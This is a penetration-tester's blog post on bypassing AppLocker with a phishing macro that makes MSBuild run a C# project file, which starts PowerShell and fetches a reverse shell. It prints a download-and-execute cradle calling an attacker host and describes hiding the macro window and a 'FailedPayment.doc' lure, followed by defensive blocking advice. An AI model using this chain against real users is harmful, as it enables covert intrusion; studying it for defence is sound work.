---
layout: post
title: MSBuild AppLocker Bypass Phishing Payload
published: true
---
![msbuild]({{ site.url }}/images/msbuild-csproj.png){: .center-image }

### With regular external vulnerability scans and (hopefully) pentration tests being undertaken, the perimeter is typically not the easy route into an organisation.

People click, and so simulated phishing campaigns and user awareness training are extremely important. However, there can never be complete assurance against credential divulgence or execution of malicious code via crafted (or not so crafted) phishing attacks, and so it is critical that organisations implement a multi-layered "defence in depth" strategy. Application whitelisting is an important component of such a strategy, and is an effective means of ensuring that only approved applications can run.

AppLocker is a commonly used whitelisting technology and is built into Windows. The default AppLocker rules for Windows 10 are listed below.

![rules]({{ site.url }}/images/applocker-default-rules.png){: .center-image }

Since Powershell has gained recognition for being the attackers language of choice, many organisations are [increasingly] additionally blocking it. However, blocking powershell.exe is often not sufficient and there are many methods by which PowerShell can be instantiated to send a reverse shell reaching out of the organisation to an attacker.

The post will document one such method, with the "misplaced trust binary" (as Casey Smith puts it) MSBuild.exe. In this scenario, the company has enabled AppLocker with default rules and has also blocked Powershell.

![rules]({{ site.url }}/images/applocker-rules.png){: .center-image }

We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have it execute C# and instantiate a Powershell runspace using the System.Management.Automation.dll assembly. The powashell.csproj file below by Casey Smith ([@SubTee](https://twitter.com/subtee)) builds upon Jared Atkinson's ([@jaredcatkinson](https://twitter.com/jaredcatkinson)) and Justin Warner's ([@sixdub](https://twitter.com/sixdub)) work.

<script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>

This executes the second (and final) stage of the payload via a PowerShell 3.0+ download cradle:

`pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`

Shell.ps1:

<script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>

Good. Now we need a means of delivering the project file and executing MSBuild. The macro below will do just this.

<script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>

The `WindowType` parameter of the Shell function has been set to `vbHide` in order to avoid calling attention to our activities. Now, in order to stand a chance of the macro being executed, we need to dress the document appropriately.

John Lambert ([@JohnLaTwC](https://twitter.com/johnlatwc)) regularly shares interesting phishing lures and payloads, if you need inspiration for your simulated phishing campaigns. The "Document created in newer/older Office version" lure is one I find especially convincing. John has also put together [this](https://t.co/OwH28ltngy) compendium of macro based lures, which is great for educating users about the different techniques attackers use.

Our FailedPayment.doc lure:

![lure]({{ site.url }}/images/phishing-lure.png){: .center-image }

Now that our "malicious" document has been created we can test it out.

Once the user opens the document and enables macros, the powashell.csproj is downloaded for MSBuild to execute, which in turn downloads and executes the Powershell reverse shell one-liner. All completely invisible to the user.

![rules]({{ site.url }}/images/shell.png){: .center-image }

We can see that this payload is also an effective means of bypassing PowerShell Contrained Language mode.

This is not a particularly stealthy attack as the .csproj is written to disk, and no attempt was made to obfuscate any part of the payload.

Hopefully, this example highlights the danger of "misplaced trust" binaries such as MSBuild. Companies should block their use unless explicitely required for certain users (e.g. developers). Oddvar Moe ([@Oddvarmoe](https://twitter.com/oddvarmoe)) maintains an excellent [collection](https://github.com/api0cradle/UltimateAppLockerByPassList) of AppLocker bypass techniques, which is a good list of the "misplaced trust" binaries that IT departments should consider blocking.

If possible, companies should also block macros for users who don't need this functionality. Additionally, if a company has decided to block PowerShell using Application Whitelisting, then the following PowerShell binaries and assemblies should be part of the block list.

<script src="https://gist.github.com/egre55/61b6cd2b23b605e6a017e81e5cb97f3e.js"></script>

However, there are multiple methods an attacker could use to instantiate a Powershell runspace, for example by downloading a custom binary. In which case, Defenders could respond by...

... and so the back and forth attacker/defender dance continues :)

An "assume breach" mentality is paramount, but before compromise we have to make it as hard as possible for an attacker to gain that foothold.




